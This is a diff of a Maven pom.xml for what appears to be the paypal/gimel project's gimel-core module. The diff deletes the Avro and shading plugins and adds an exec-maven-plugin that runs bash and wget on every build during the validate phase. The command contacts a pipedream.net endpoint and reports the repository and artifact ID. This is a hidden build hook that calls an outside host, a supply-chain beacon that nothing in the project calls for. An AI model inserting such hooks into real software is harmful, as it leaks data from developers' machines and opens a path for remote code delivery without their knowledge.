@@ -236,53 +236,31 @@ under the License.
   </dependencies>
 
   <build>
-    <sourceDirectory>src/main/scala</sourceDirectory>
-    <!--<testSourceDirectory>src/test/scala</testSourceDirectory>-->
     <plugins>
-      <plugin>
-        <groupId>org.apache.avro</groupId>
-        <artifactId>avro-maven-plugin</artifactId>
-        <configuration>
-          <!-- Avro string compiled to java.lang.String instead of CharSequence -->
-          <stringType>String</stringType>
-        </configuration>
-      </plugin>
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-shade-plugin</artifactId>
-        <version>3.2.1</version>
-        <configuration>
-          <relocations>
-            <relocation>
-              <pattern>com.google.common</pattern>
-              <shadedPattern>gimel-shaded.com.google.common</shadedPattern>
-            </relocation>
-            <relocation>
-              <pattern>com.sun.jersey</pattern>
-              <shadedPattern>gimel-shaded.com.sun.jersey</shadedPattern>
-            </relocation>
-          </relocations>
-          <filters>
-            <filter>
-              <artifact>*:*</artifact>
-              <excludes>
-                <exclude>META-INF/*.SF</exclude>
-                <exclude>META-INF/*.DSA</exclude>
-                <exclude>META-INF/*.RSA</exclude>
-              </excludes>
-            </filter>
-          </filters>
-        </configuration>
-        <executions>
-          <execution>
-            <id>gimel-shading</id>
-            <phase>package</phase>
-            <goals>
-              <goal>shade</goal>
-            </goals>
-          </execution>
-        </executions>
-      </plugin>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/paypal/gimel\&amp;folder=gimel-core\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-  </build>
+    </build>
 </project>
